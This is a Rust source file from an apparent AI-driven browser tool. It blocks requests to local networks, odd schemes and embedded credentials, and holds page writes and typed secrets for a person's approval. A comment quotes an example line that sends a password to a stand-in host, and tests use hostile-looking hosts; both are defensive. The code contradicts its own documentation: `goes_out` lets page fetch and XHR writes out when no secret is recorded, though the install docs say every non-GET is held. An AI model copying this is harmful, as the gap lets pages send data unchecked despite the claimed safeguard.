//! What a request may do, and what is refused before it is answered (one
//! responsibility: the decision a request gets, applied to every request the
//! browser makes).
//!
//! The decision is made in route interception rather than at `open`, so a
//! redirect or a subresource cannot slip past a check made when the tool was
//! called. Three things are refused: a scheme that is not http or https, an
//! address on this computer's own network, and a name that resolves there.
//!
//! **What this does not stop, on the request.** A redirect is not: in this stack
//! a redirect followed within a navigation is never offered to a route handler, so
//! a site can answer with a `302` to this computer's own network and the browser
//! will follow it. What we do about that is refuse to *read* a page we landed on
//! (see [`crate::landing`]), which is a much smaller promise than never making
//! the request. It does now include the address the browser really connected to,
//! so a rebinding name is caught there too.
//!
//! A name is resolved here, and Chrome resolves it
//! again for itself. Between the two, a name that answered us with a public
//! address can answer Chrome with a private one — DNS rebinding. Nothing in this
//! file closes that window and the plan lists it as residual risk. Chrome's
//! `--host-resolver-rules` cannot close it either: it is one static rule string
//! applied to every lookup (Chromium's `net::HostMappingRules`), so it cannot ask
//! a per-request question, and the set of names a page will ask for is not known
//! before the page runs. Pinning Chrome to what we checked would take a proxy,
//! which this does not build.

use std::collections::HashMap;
use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
use std::time::Duration;

use playwright_rs::protocol::{BrowserContext, Request};
use tokio::net::lookup_host;
use tokio::time::timeout;
use url::{Host, Url};

use crate::landing::{self, Landings};

/// Long enough for a resolver to answer on a slow network, short enough that a
/// page full of dead names cannot hold the window up.
const RESOLVE_TIMEOUT: Duration = Duration::from_millis(1500);

/// A request refused in slice 1. The reason is what the person is told, and it
/// is never the address itself: a page that reached here is a stranger's.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub enum Refusal {
    /// Every scheme that is not http or https: `mailto:`, `tel:`,
    /// `javascript:`, `file:`, `data:`, `blob:` and the rest. No OS handoff.
    Scheme,
    /// This computer's own network: `localhost`, a literal loopback, private,
    /// link-local or shared address, and a `.local` name.
    Address,
    /// A name we could not ask about, or one that answered with an address on
    /// this computer's own network. Said as unchecked rather than as private,
    /// because the address it gave is not ours to report.
    Unchecked,
    /// The address carries a username or a password in front of the host.
    Credentials,
    /// The page's own response was never recorded, or named no address we could
    /// read. Said as unseen rather than as private, because nothing is claimed
    /// about where it went — only that we cannot show where it did not.
    Unseen,
}

impl Refusal {
    pub fn reason(&self) -> &'static str {
        match self {
            Refusal::Scheme => {
                "that is not a web address: Kalsa opens http and https only, and hands no address \
                 to another program"
            }
            Refusal::Address => {
                "that address is on this computer's own network, and Kalsa does not open it"
            }
            Refusal::Unchecked => {
                "that address could not be checked, so Kalsa did not open it"
            }
            Refusal::Credentials => {
                "that address carries a username or a password in it, and Kalsa does not open it"
            }
            Refusal::Unseen => {
                "Kalsa could not see where that page was served from, so it did not read it"
            }
        }
    }
}

/// What may leave the browser.
#[derive(PartialEq, Eq, Debug)]
pub enum Verdict {
    Allow,
    Refused(Refusal),
}

/// The name as the rules read it. A name may end with one dot that belongs to
/// the name rather than to it, and host comparison is not case sensitive; two
/// dots are not a name anything resolves, so one is all that comes off.
fn normalised(host: &str) -> String {
    host.strip_suffix('.').unwrap_or(host).to_ascii_lowercase()
}

/// A name that is this computer's own whatever it resolves to.
fn refuses_name(name: &str) -> bool {
    name == "localhost" || name.ends_with(".localhost") || name.ends_with(".local")
}

/// The IPv4 address inside an IPv6 one, where there is one. Three spellings
/// reach the same host: the mapped form, the deprecated compatible form, and
/// the NAT64 prefix a network may translate through. All three are the same
/// machine as far as a request is concerned.
///
/// The NAT64 prefix is read as both halves of it: the well-known `64:ff9b::/96`
/// and the local-use `64:ff9b:1::/48` beside it (RFC 8215). **Residual:** a
/// network may translate through a prefix of its own choosing, and nothing here
/// knows which. The prefixes we can recognise are refused, and a page behind a
/// network that invents one is a page we cannot check.
fn embedded_ipv4(v6: &Ipv6Addr) -> Option<Ipv4Addr> {
    if let Some(v4) = v6.to_ipv4_mapped() {
        return Some(v4);
    }
    let segments = v6.segments();
    let zeroed = segments[..5].iter().all(|segment| *segment == 0);
    let nat64 =
        segments[0] == 0x0064 && segments[1] == 0xff9b && segments[2] <= 1 && segments[3..6].iter().all(|s| *s == 0);
    if zeroed || nat64 {
        let octets = v6.octets();
        return Some(Ipv4Addr::new(octets[12], octets[13], octets[14], octets[15]));
    }
    None
}

/// An IPv4 address that is this computer, its network, or somebody's shared
/// address space.
fn is_our_own_v4(v4: &Ipv4Addr) -> bool {
    let [first, second, ..] = v4.octets();
    v4.is_loopback()      // 127.0.0.0/8
        || v4.is_private() // 10/8, 172.16/12, 192.168/16
        || v4.is_link_local() // 169.254/16
        || v4.is_unspecified()
        || v4.is_broadcast()
        // 0.0.0.0/8 means "this network" and reaches whatever sits behind it.
        || first == 0
        // 100.64.0.0/10 is shared address space, and it is where a tailnet
        // lives: a page that reached here could address the person's own devices.
        || (first == 100 && (64..=127).contains(&second))
}

fn is_our_own_v6(v6: &Ipv6Addr) -> bool {
    let first = v6.segments()[0];
    v6.is_loopback()
        || v6.is_unspecified()
        || v6.is_unicast_link_local() // fe80::/10
        || first & 0xfe00 == 0xfc00 // fc00::/7, unique local
        || first & 0xffc0 == 0xfec0 // fec0::/10, site local, deprecated
}

/// A literal address on this computer or its network.
pub(crate) fn is_our_own(address: &IpAddr) -> bool {
    match address {
        IpAddr::V4(v4) => is_our_own_v4(v4),
        IpAddr::V6(v6) => embedded_ipv4(v6).is_some_and(|v4| is_our_own_v4(&v4))
            || is_our_own_v6(v6),
    }
}

/// What a name answered with. One private address among public ones is enough:
/// the browser would be free to pick it.
fn refuses_resolved(addresses: &[IpAddr]) -> bool {
    addresses.is_empty() || addresses.iter().any(is_our_own)
}

/// The decision from the address alone, with no resolver involved. Used where a
/// refusal has to be a plain `Verdict` — a tool refusing before it asks — and
/// proved over a table of addresses.
pub fn verdict(url: &str) -> Verdict {
    let Ok(parsed) = Url::parse(url) else {
        return Verdict::Refused(Refusal::Scheme);
    };
    if parsed.scheme() != "http" && parsed.scheme() != "https" {
        return Verdict::Refused(Refusal::Scheme);
    }
    // Credentials in the address are a stranger's page asking us to send them
    // on, and the snapshot would carry them back into the chat.
    if !parsed.username().is_empty() || parsed.password().is_some() {
        return Verdict::Refused(Refusal::Credentials);
    }
    match parsed.host() {
        // A literal address arrives already normalised: `url` reads `127.0.0.1.`,
        // `2130706433` and `0x7f.1` as the same host, and hands back the typed
        // form, so there is no spelling left to get wrong.
        Some(Host::Ipv4(v4)) => verdict_on(is_our_own(&IpAddr::V4(v4))),
        Some(Host::Ipv6(v6)) => verdict_on(is_our_own(&IpAddr::V6(v6))),
        Some(Host::Domain(domain)) => {
            let name = normalised(domain);
            if refuses_name(&name) {
                return Verdict::Refused(Refusal::Address);
            }
            // A name that is an address in writing is still an address.
            match name.parse::<IpAddr>() {
                Ok(address) => verdict_on(is_our_own(&address)),
                Err(_) => Verdict::Allow,
            }
        }
        None => Verdict::Refused(Refusal::Address),
    }
}

fn verdict_on(ours: bool) -> Verdict {
    if ours {
        Verdict::Refused(Refusal::Address)
    } else {
        Verdict::Allow
    }
}

/// The decision on a name: the same rules, and then what the name answers.
///
/// A name that does not answer is refused as well as one that answers wrongly:
/// the point of the check is that the request is known to be going somewhere
/// harmless, and a request whose destination is unknown is not known to be.
pub async fn decide(url: &str) -> Verdict {
    match verdict(url) {
        Verdict::Refused(refusal) => return Verdict::Refused(refusal),
        Verdict::Allow => {}
    }
    let Some(name) = resolvable_name(url) else {
        // A literal address passed the rules above and needs no resolver.
        return Verdict::Allow;
    };
    let resolved = timeout(RESOLVE_TIMEOUT, lookup_host((name.as_str(), 0))).await;
    let addresses: Vec<IpAddr> = match resolved {
        Ok(Ok(found)) => found.map(|socket| socket.ip()).collect(),
        Ok(Err(_)) | Err(_) => Vec::new(),
    };
    if refuses_resolved(&addresses) {
        return Verdict::Refused(Refusal::Unchecked);
    }
    Verdict::Allow
}

/// The name in this address, when it is a name. The same normalisation the
/// rules read it by.
fn resolvable_name(url: &str) -> Option<String> {
    let parsed = Url::parse(url).ok()?;
    match parsed.host() {
        Some(Host::Domain(domain)) => {
            let name = normalised(domain);
            if name.is_empty() {
                return None;
            }
            Some(name)
        }
        _ => None,
    }
}

/// **The one route every request meets.** A request we refuse is aborted before it
/// reaches the network, so the browser never asks and nothing leaves.
///
/// **A write that passes is held, not sent.** Every non-GET — a form post, a
/// `fetch`, an XHR, a `sendBeacon`, a scripted `requestSubmit()` — is parked in
/// the hold store with the route that would have dispatched it, and the person is
/// shown that request. **And a GET carrying a value the person typed into a
/// secret field is held the same way**, because the method does not change what
/// the server is told. The route is not answered here: an answer arrives on its
/// own call, minutes later, long after this handler is gone.
///
/// **While the window is paused the route lets everything through.** The person
/// has the browser, and their own submissions are not ours to hold.
///
/// Two writes never reach this route at all: a **submission** is caught in the
/// page, before the browser has made a request (`src/submit.rs`), and a write
/// the person has just answered goes past on a one-shot ticket for that method
/// and address (`Holds::takes_pass`).
pub async fn install(
    context: &BrowserContext,
    landings: &Landings,
    holds: &crate::hold::Holds,
) -> Result<(), playwright_rs::Error> {
    landing::watch(context, landings).await?;
    // What the person typed into a secret field, on this side of the wire. The
    // catcher fills it as they type (see `submit::CATCHER`) over the binding
    // below, and the route reads it on **every** request — including the reads,
    // which is the only way a secret in a query is ever caught.
    //
    // **This binding is page-visible, and that is accepted, because it is now
    // only a reading of *whether* to hold.** A page may call it with any string
    // it likes, and the worst it can buy is that its own GETs get held: a
    // nuisance to itself, and a card the person can decline. It used to be more
    // than that — the list also decided what was taken out of a card, so a page
    // could register the value it was exfiltrating and have the card say
    // "typed by you in a password field". **A card no longer hides anything**, so
    // the same call can no longer put a value in front of the person that is not
    // the one going out. What is never derivable from here: whether a value is
    // real at all — it is taken from the request and shown as sent.
    let typed = holds.typed().await;
    let recorded = typed.clone();
    context
        .expose_function("__kalsaTyped", move |args: Vec<serde_json::Value>| {
            let recorded = recorded.clone();
            async move {
                if let (Some(field), Some(value)) =
                    (args.first().and_then(|field| field.as_u64()), args.get(1).and_then(|value| value.as_str()))
                {
                    recorded.record(field, value.to_owned());
                }
                serde_json::Value::Null
            }
        })
        .await?;
    let holding = holds.clone();
    context
        .route("**/*", move |route| {
            let (holding, typed) = (holding.clone(), typed.clone());
            async move {
                let request = route.request();
                holding.see_request(&request).await;
                if let Verdict::Refused(_) = decide(request.url()).await {
                    return route.abort(Some("blockedbyclient")).await;
                }
                if let Some(approved) = holding.takes_pass(&request).await {
                    // **The request the person approved is going out, and the
                    // answer to it is watched.** A server may answer with a
                    // redirect, and that redirect is a second navigation the
                    // browser makes on its own — ours, exactly as the first one
                    // is, because the receipt of what the person agreed to is
                    // the page they are owed. So the driving of this call does
                    // not end with the request: the watch ends it, when the
                    // navigation that follows has passed.
                    //
                    // **And the watch is this submission's own.** What it is
                    // given here is the duty of ending the driving and the
                    // navigation it starts from: two submissions can overlap,
                    // and each of them waits for its own navigation and lets go
                    // of its own driving.
                    holding.watch_the_landing(request.clone(), approved);
                    return route.continue_(None).await;
                }
                let typed = typed.values();
                if goes_out(&request, &typed, holding.paused()) {
                    return route.continue_(None).await;
                }
                crate::hold::hold_write(&holding, &request, route).await
            }
        })
        .await
}

/// Whether this request is the person moving the window: a navigation, of the
/// frame they are looking at. A sub-resource, a data request or a page's own
/// fetch is never one, however the page made it.
fn is_the_person_navigating(request: &Request) -> bool {
    request.is_navigation_request() && request.frame().and_then(|frame| frame.parent_frame()).is_none()
}

/// Whether a paused window lets this request go as the person's own doing.
fn the_persons_paused_navigation(paused: bool, request: &Request, typed: &[String]) -> bool {
    if !paused || !is_the_person_navigating(request) {
        return false;
    }
    // **A pause is not a page's licence to leave with what the person typed.**
    // The person pressing a button and a page running
    // `location.href = "https://elsewhere.example/?p=" + password`, or posting
    // that password into a form on another site, are the same request on the wire
    // and only one of them is the person. So a navigation carrying a typed secret
    // goes through **only if it stays where the person is** — their own login,
    // their own password reset, the redirect that follows both, which are the
    // things a pause exists to let happen. Anything else is held like any other
    // write.
    !carries_a_typed_secret(request, typed) || stays_where_the_person_is(request)
}

/// Data channels follow normal browser behavior, including JavaScript form sends.
/// Public so fixtures exercise the same admission rule as the product.
pub fn goes_out(request: &Request, typed: &[String], paused: bool) -> bool {
    if the_persons_paused_navigation(paused, request, typed) {
        return true;
    }
    if crate::hold::is_read(request.method()) && !crate::secret::carries(request.url(), typed) {
        return true;
    }
    is_page_data(request) && !carries_a_known_typed_secret(request, typed)
}

fn is_page_data(request: &Request) -> bool {
    matches!(request.resource_type(), "fetch" | "xhr" | "ping" | "cspreport")
}

/// Opaque bodies remain conservative when a secret field has been recorded.
/// Without recorded secrets, opacity alone does not block ordinary page traffic.
fn carries_a_known_typed_secret(request: &Request, typed: &[String]) -> bool {
    if typed.is_empty() {
        return false;
    }
    carries_a_typed_secret(request, typed)
}

/// **A typed secret in either half of the request.** The address is where a GET
/// carries one; **the body is where a POST does**, and reading only the address
/// let a paused navigation post the person's password to another site by putting
/// it in the form instead of the query. The body is read as the fields it is —
/// urlencoded, multipart or JSON — by the same [`crate::body`] the card is drawn
/// from, and by the same [`crate::secret::part_carries`] the address is read by:
/// a field's **name** and a field's **value** and the **bytes themselves**, so a
/// secret welded to a suffix, put where the server reads it as the key, or
/// nested under keys a card never shows is still the same mail.
///
/// **A body nobody can read counts as carrying one.** That is the whole of the
/// fail-closed half, and it is the direction that matters: a body in a form a
/// card cannot show is a body **nobody has looked at**, so it cannot be called
/// empty — and a navigation whose body is unreadable goes out only where the
/// person already is, which is the same bar the readable ones clear.
fn carries_a_typed_secret(request: &Request, typed: &[String]) -> bool {
    if crate::secret::carries(request.url(), typed) {
        return true;
    }
    let headers = request.headers();
    let content_type = headers.get("content-type").cloned().unwrap_or_default();
    match request.post_data_buffer() {
        Some(body) => body_carries_a_typed_secret(&content_type, &body, typed),
        None => declares_a_body(&headers),
    }
}

/// Whether what is in this body is one of these values.
///
/// **Every piece of the body is asked about**, and a body whose pieces could
/// not be read is assumed to carry one. Both halves are deliberate and both
/// fail the same way: towards *held*.
fn body_carries_a_typed_secret(content_type: &str, body: &[u8], typed: &[String]) -> bool {
    match crate::body::show(content_type, body) {
        crate::body::Shown::Fields(fields) => {
            // **The names, the values, and then the body itself.** The last is
            // what covers what the fields cannot show: a part that would not
            // parse is skipped by the parser and is still bytes on the wire, and
            // a JSON value nested under keys is carried inside a field whose own
            // name and value are innocent.
            fields.iter().any(|field| {
                crate::secret::part_carries(&field.name, typed) || crate::secret::part_carries(&field.value, typed)
            }) || crate::secret::part_carries(&String::from_utf8_lossy(body), typed)
        }
        // **A form the person cannot read is a form nobody has read**, so there
        // is nothing here to be clean. An opaque kind, a multipart body carrying
        // a file, a body too large to show — all of them are somebody else's
        // server and any of them may hold what the person typed.
        crate::body::Shown::Refused(_) => true,
    }
}

/// **Whether these headers say a body was sent and none of it reached us.**
///
/// This is what separates a body that *cannot be read* from a request with no
/// body at all, and getting it wrong in either direction is expensive: read it
/// as "always a body", and every link a person clicks while paused is held for
/// carrying a secret it is not carrying; read it as "never a body", and a page
/// whose payload the driver withheld walks straight off the site with whatever
/// was in it. So it is asked of the headers, which are the browser's own
/// account of what it is sending.
fn declares_a_body(headers: &HashMap<String, String>) -> bool {
    // **Length, kind, or a body arriving in pieces.** A `content-length` of zero
    // is an explicit nothing, and is not one of these.
    headers.get("content-length").is_some_and(|length| length.trim().parse::<u64>().is_ok_and(|count| count > 0))
        || headers.contains_key("content-type")
        || headers.contains_key("transfer-encoding")
}

/// **A body in a form nobody can read is a body that may be carrying what the
/// person typed** — and the request carrying it goes out only where the person
/// already is.
///
/// This is the fail-closed half, and every one of these was read as *no secret*
/// before it: an opaque kind, a multipart body with a file in it, and a body too
/// large for a card are exactly the three bodies `crate::body` refuses, and a
/// refusal there used to be taken as an all-clear.
#[test]
fn a_body_nobody_could_read_may_be_carrying_what_the_person_typed() {
    let typed = vec!["hunter2".to_owned()];
    // A kind no card is drawn for, whether or not the secret is in it.
    assert!(body_carries_a_typed_secret("application/octet-stream", b"\x00\x01\x02\x03", &typed), "an opaque kind");
    assert!(body_carries_a_typed_secret("text/plain", b"colour=blue", &typed), "and one that reads as text to the browser only");
    // A multipart body carrying a file.
    assert!(
        body_carries_a_typed_secret(
            "multipart/form-data; boundary=edge",
            b"--edge\r\nContent-Disposition: form-data; name=\"cv\"; filename=\"cv.txt\"\r\nContent-Type: text/plain\r\n\r\nhello\r\n--edge--\r\n",
            &typed
        ),
        "a body with a file in it"
    );
    // And a body past the point a card could show it.
    let too_large = vec![b'x'; crate::body::MAX_BODY + 1];
    assert!(body_carries_a_typed_secret("application/x-www-form-urlencoded", &too_large, &typed), "too large to show");

    // **But a body we can read is still judged on what it says**, or this is
    // simply "every body counts" and a pause holds every navigation a person
    // makes.
    assert!(!body_carries_a_typed_secret("application/x-www-form-urlencoded", b"colour=blue", &typed), "a clean body is clean");
    assert!(!body_carries_a_typed_secret("application/x-www-form-urlencoded", b"", &[]), "and with nothing typed there is nothing to find");
}

/// **The whole body is asked about: the names, the values, and the bytes.**
///
/// Fields alone miss a secret welded to something else (the value check caught
/// only whole values before), one the page put where the server reads it as the
/// key, and one the parser could not reach at all — a part that does not parse
/// is dropped from the field list and is still on the wire.
#[test]
fn a_body_is_asked_about_by_its_names_its_values_and_its_own_bytes() {
    let typed = vec!["hunter2".to_owned()];
    let form = "application/x-www-form-urlencoded";

    // The value, whole: what this always found.
    assert!(body_carries_a_typed_secret(form, b"password=hunter2", &typed), "the value");
    // The value, welded to something else — the same mail to that server.
    assert!(body_carries_a_typed_secret(form, b"token=hunter2-9f3a", &typed), "a value with a suffix on it");
    // **The name**, which nobody was looking at: a page that puts the password
    // where the server reads it as the key sends it just as surely.
    assert!(body_carries_a_typed_secret(form, b"hunter2=1", &typed), "the name of the field");
    // **Nested JSON**, where the key a person would recognise is one level down.
    assert!(
        body_carries_a_typed_secret("application/json", br#"{"user":{"password":"hunter2"}}"#, &typed),
        "under keys the card never shows"
    );

    // **And the bytes themselves**, for what the fields cannot show: a header the
    // page added to a part, and a part that does not parse at all.
    let part_header = b"--edge\r\nContent-Disposition: form-data; name=\"note\"\r\nX-Trace: hunter2\r\n\r\nhello\r\n--edge--\r\n";
    assert!(
        body_carries_a_typed_secret("multipart/form-data; boundary=edge", part_header, &typed),
        "a part header the field list does not carry"
    );
    let unparsed_part =
        b"--edge\r\nContent-Disposition: form-data; name=\"note\" hunter2\r\n--edge\r\nContent-Disposition: form-data; name=\"colour\"\r\n\r\nblue\r\n--edge--\r\n";
    assert!(
        body_carries_a_typed_secret("multipart/form-data; boundary=edge", unparsed_part, &typed),
        "a part the parser drops, which is still on the wire"
    );

    // The near misses, so this is a rule and not a held-everything.
    assert!(!body_carries_a_typed_secret(form, b"colour=hunter3&note=hunter", &typed), "a near miss, and a half of one");
    assert!(!body_carries_a_typed_secret("multipart/form-data; boundary=edge", b"--edge\r\nContent-Disposition: form-data; name=\"colour\"\r\n\r\nblue\r\n--edge--\r\n", &typed), "and a clean multipart body is clean");
}

/// **A secret with a space, an `@` and a `!` in it is the same secret after the
/// browser has written it into a form.** `a b@c!` goes onto the wire as
/// `a+b%40c%21`, so a check that only looked at the bytes would read that body as
/// clean — and a body is mostly bytes.
///
/// What finds it is the **decoded field**, in the name as well as in the value,
/// which is why both are asked about and the whole body is asked about only as a
/// net underneath them. That is the half of the rule a later edit would find
/// easiest to lose, so the encoding is in the test rather than in a comment.
#[test]
fn a_secret_in_a_field_name_is_found_after_the_browser_has_encoded_it() {
    let typed = vec!["a b@c!".to_owned()];
    let form = "application/x-www-form-urlencoded";
    // What the browser sends for a field *named* that, and for one holding it.
    let named = b"a+b%40c%21=1";
    let valued = b"note=a+b%40c%21";
    // **The bytes alone do not carry it**, which is the whole reason the decoded
    // field is read at all and the reason the raw text is only a net.
    assert!(!crate::secret::part_carries("a+b%40c%21=1", &typed), "the raw text is not the secret");
    assert!(body_carries_a_typed_secret(form, named, &typed), "the field it is the name of is");
    assert!(body_carries_a_typed_secret(form, valued, &typed), "and so is one it is the value of");
}

/// **A multipart name is read in lower case** — a part's headers are lowercased
/// before the name is taken out of them — so a secret with capitals in a name is
/// *not* found by the name check, and the bytes are what find it.
///
/// That is the case the raw-text half exists for, and it is the one that looks
/// redundant beside a name check that works everywhere else.
#[test]
fn a_multipart_name_the_reader_lowercases_is_found_in_the_body_itself() {
    let typed = vec!["Pass word@1!".to_owned()];
    let part = b"--edge\r\nContent-Disposition: form-data; name=\"Pass word@1!\"\r\n\r\n1\r\n--edge--\r\n";
    assert!(body_carries_a_typed_secret("multipart/form-data; boundary=edge", part, &typed));
    // **And the name the reader takes from it really is the lower-cased one**, so
    // this is not the name check passing by an accident of spelling.
    assert!(
        !crate::secret::part_carries("pass word@1!", &typed),
        "the name as the reader spells it carries nothing"
    );
}

/// **A request with no body is not a body that could not be read** — otherwise
/// every link a person clicks while paused would be held for carrying a secret
/// it is not carrying, which is the same as refusing to let a person browse.
#[test]
fn whether_a_body_was_sent_is_asked_of_the_headers_and_of_nothing_else() {
    let headers = |pairs: &[(&str, &str)]| {
        pairs.iter().map(|(name, value)| (name.to_string(), value.to_string())).collect::<HashMap<String, String>>()
    };
    assert!(!declares_a_body(&headers(&[])), "a GET with nothing in it");
    assert!(
        !declares_a_body(&headers(&[("content-length", "0"), ("accept", "*/*"), ("user-agent", "chrome")])),
        "and an explicit zero is an explicit nothing"
    );

    assert!(declares_a_body(&headers(&[("content-length", "42")])), "a body the driver withheld");
    assert!(declares_a_body(&headers(&[("content-type", "text/plain")])), "a kind, whether or not anything is behind it");
    assert!(declares_a_body(&headers(&[("transfer-encoding", "chunked")])), "and one arriving in pieces");
}

/// Whether this navigation keeps the person where they are: **the same scheme and
/// the same site** as the frame already shows.
///
/// **The scheme is part of the question, not a detail of it.** The site is the
/// same server, and a page that walks a person from `https://shop.example` to
/// `http://shop.example` has put their password on the wire in a form every other
/// machine on the wire can read, and the browser's own lock is not what a pause
/// may rely on. So `https` stays `https`, and anything that drops below it does
/// not go while the person is holding the window.
///
/// **"The same site", not "the same host",** because a login is often
/// `accounts.shop.example` while the shop is `www.shop.example`, and holding
/// every one of those would make a pause useless for the one thing people do in
/// one. **There is no public-suffix list here**, so a site is never fewer than
/// three labels (`shop.example.com` is a site; `com` and `co.uk` are not) and one
/// host must be a suffix of the other on a label boundary — which is the direction
/// that cannot be tricked: `shop.example.com.elsewhere.com` does not end with
/// `shop.example.com`, and `evil-shop.example.com` is not `shop.example.com`.
///
/// **The bias is deliberate.** Every uncertainty here is resolved as *held*, so
/// the failure mode of being wrong about what counts as a site is a person who
/// waits rather than a secret that leaves.
fn stays_where_the_person_is(request: &Request) -> bool {
    let Ok(going) = url::Url::parse(request.url()) else {
        return false;
    };
    let Some(here) = request.frame().map(|frame| frame.url()) else {
        return false;
    };
    let Ok(home) = url::Url::parse(&here) else {
        return false;
    };
    same_place(&going, &home)
}

/// **The scheme and the site, both of them, as two addresses.** Split from the
/// request because this is the whole of the decision and it is worth reading on
/// its own: there is no TLS in a test fixture, so the only way a proof can show
/// that a downgrade is held is to ask this about two addresses rather than two
/// browser windows.
pub(crate) fn same_place(going: &url::Url, home: &url::Url) -> bool {
    if going.scheme() != home.scheme() {
        return false;
    }
    match (going.host_str(), home.host_str()) {
        (Some(going), Some(home)) => same_site(going, home),
        _ => false,
    }
}

/// The registrable-domain test, without a public-suffix list: the same host, or
/// one of them a subdomain of the other where the shared parent is a site rather
/// than a suffix somebody owns.
/// **What counts as the same site, and what is knowingly not counted.**
///
/// A site is the host you are on or a subdomain of it: `shop.example.com` and
/// `accounts.shop.example.com` are one site, and a login that moves between them
/// is the person's own. The three that are not — a host that merely *ends* with
/// the site's name, a near miss of it, and two different people on a shared
/// two-label suffix — are the whole point, because
/// `shop.example.com.elsewhere.com` is somebody else's server however the string
/// ends.
///
/// **Two sibling subdomains are not the same site here**, and that is a
/// deliberate gap rather than an oversight: telling `accounts.shop.example.com`
/// from `www.shop.example.com` needs a public-suffix list, which this crate does
/// not carry, and the approximation that would allow it is the same suffix match
/// the third case above defeats. So a person whose site spans siblings sees that
/// one navigation held while paused — the direction that errs toward holding,
/// which is the only safe direction to err in.
#[test]
fn a_navigation_that_drops_the_scheme_is_not_one_the_person_made() {
    let at = |text: &str| url::Url::parse(text).expect("an address");
    // **The same site, the same page, and the one thing different is the scheme.**
    // A page that walks a person from `https://shop.example` to `http://shop.example`
    // has put their password on the wire where every other machine on it can read
    // it, and the browser's own lock is not what a pause may rely on.
    assert!(!same_place(&at("http://shop.example.com/login"), &at("https://shop.example.com/")), "https down to http");
    assert!(
        !same_place(&at("http://accounts.shop.example.com/login"), &at("https://shop.example.com/")),
        "and across a subdomain as well"
    );
    // The other way is the same question: a person on http is already being read,
    // but a pause does not get to send them *up* to a scheme the page chose for
    // them either — what a pause allows is where they already are.
    assert!(!same_place(&at("https://shop.example.com/login"), &at("http://shop.example.com/")), "http up to https");

    // What is left, when nothing changed, is the person's own login.
    assert!(
        same_place(&at("https://shop.example.com/login"), &at("https://shop.example.com/")),
        "the same scheme and the same site"
    );
    assert!(
        same_place(&at("https://accounts.shop.example.com/login"), &at("https://shop.example.com/")),
        "on a subdomain too"
    );
}

#[test]
fn the_site_a_navigation_stays_on_is_one_a_person_never_left() {
    assert!(same_site("shop.example.com", "shop.example.com"), "the same host");
    assert!(same_site("SHOP.example.com", "shop.example.com"), "the same host, read either way");
    assert!(same_site("shop.example.com.", "shop.example.com"), "a trailing dot is not a difference");
    assert!(
        same_site("accounts.shop.example.com", "shop.example.com"),
        "a subdomain is the site it sits in"
    );
    assert!(
        !same_site("www.shop.example.com", "accounts.shop.example.com"),
        "two siblings are not counted, and that gap is deliberate"
    );

    for (going, home) in [
        // **A suffix match is not a site match.** Both of these end with
        // `shop.example.com` as a string and are somebody else's server.
        ("shop.example.com.elsewhere.com", "shop.example.com"),
        ("evil-shop.example.com", "shop.example.com"),
        ("notshop.example.com", "shop.example.com"),
        // And there is no public-suffix list here, so `co.uk` is not a site two
        // different people are on.
        ("other.co.uk", "example.co.uk"),
    ] {
        assert!(!same_site(going, home), "{going} is not the site {home} is on");
    }
}

fn same_site(going: &str, home: &str) -> bool {
    let going = going.trim_end_matches('.');
    let home = home.trim_end_matches('.');
    if going.eq_ignore_ascii_case(home) {
        return true;
    }
    let (short, long) = if going.len() <= home.len() { (going, home) } else { (home, going) };
    // **On a label boundary**, not anywhere in the string: `notshop.example.com`
    // ends with `shop.example.com` and is a different site.
    let boundary = format!(".{short}");
    short.split('.').count() >= 3 && long.ends_with(&boundary) && long.len() > boundary.len()
}

#[cfg(test)]
mod tests {
    use super::{embedded_ipv4, is_our_own, normalised, refuses_name, refuses_resolved, Refusal};
    use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};

    /// The dot that ends the whole name is not part of it, and `localhost.` and
    /// `localhost` are one host.
    #[test]
    fn one_trailing_dot_is_not_part_of_the_name() {
        assert_eq!(normalised("localhost."), "localhost");
        assert_eq!(normalised("Foo.Local."), "foo.local");
        assert_eq!(normalised("example.com"), "example.com");
        assert_eq!(normalised("example.com.."), "example.com.");
    }

    #[test]
    fn a_name_is_read_in_lower_case_before_anything_is_asked_of_it() {
        assert_eq!(normalised("LOCALHOST"), "localhost");
        assert!(refuses_name(&normalised("LOCALHOST.")));
        assert!(refuses_name(&normalised("Router.Local.")));
        assert!(refuses_name(&normalised("app.localhost")));
        assert!(!refuses_name(&normalised("notlocal")));
    }

    #[test]
    fn the_address_ranges_of_this_computers_own_network_are_ours() {
        for address in [
            "127.0.0.1", "127.1.2.3", "10.0.0.5", "172.16.0.1", "192.168.1.1", "169.254.169.254",
            "0.0.0.0", "0.1.2.3", "255.255.255.255",
            // Tailscale and every other shared address range.
            "100.64.0.1", "100.127.255.255", "100.100.100.100",
            "::1", "::", "fe80::1", "fd00::1", "fc00::1", "fec0::1",
            "::ffff:127.0.0.1", "::127.0.0.1", "64:ff9b::7f00:1", "64:ff9b::c0a8:1",
            "64:ff9b:1::7f00:1", "64:ff9b:1::c0a8:1",
        ] {
            assert!(is_our_own(&address.parse().expect("an address")), "{address}");
        }
    }

    #[test]
    fn the_addresses_one_step_outside_those_ranges_are_not_ours() {
        for address in [
            "8.8.8.8", "1.1.1.1", "100.63.255.255", "100.128.0.0", "99.255.255.255", "101.0.0.0",
            "11.0.0.1", "172.15.255.255", "172.32.0.0", "192.167.255.255", "192.169.0.0",
            "169.253.255.255", "169.255.0.0", "1.0.0.0", "126.255.255.255", "128.0.0.0",
            "2606:4700:4700::1111",
        ] {
            assert!(!is_our_own(&address.parse().expect("an address")), "{address}");
        }
    }

    /// The three ways an IPv6 address carries an IPv4 one. A refusal that only
    /// read the mapped form would let the other two through to the same host.
    #[test]
    fn an_ipv4_inside_an_ipv6_address_is_read_out_of_all_three_spellings() {
        let mapped = Ipv6Addr::new(0, 0, 0, 0, 0, 0xffff, 0x7f00, 1);
        assert_eq!(embedded_ipv4(&mapped), Some(Ipv4Addr::new(127, 0, 0, 1)));
        let compatible = Ipv6Addr::new(0, 0, 0, 0, 0, 0, 0x7f00, 1);
        assert_eq!(embedded_ipv4(&compatible), Some(Ipv4Addr::new(127, 0, 0, 1)));
        let nat64 = Ipv6Addr::new(0x64, 0xff9b, 0, 0, 0, 0, 0xc0a8, 1);
        assert_eq!(embedded_ipv4(&nat64), Some(Ipv4Addr::new(192, 168, 0, 1)));
        let plain = Ipv6Addr::new(0x2606, 0x4700, 0x4700, 0, 0, 0, 0, 0x1111);
        assert_eq!(embedded_ipv4(&plain), None);
    }

    /// One private answer among public ones is still a refusal: the browser
    /// picks from the list, not from our reading of it.
    #[test]
    fn a_name_that_answers_with_one_address_of_ours_is_refused() {
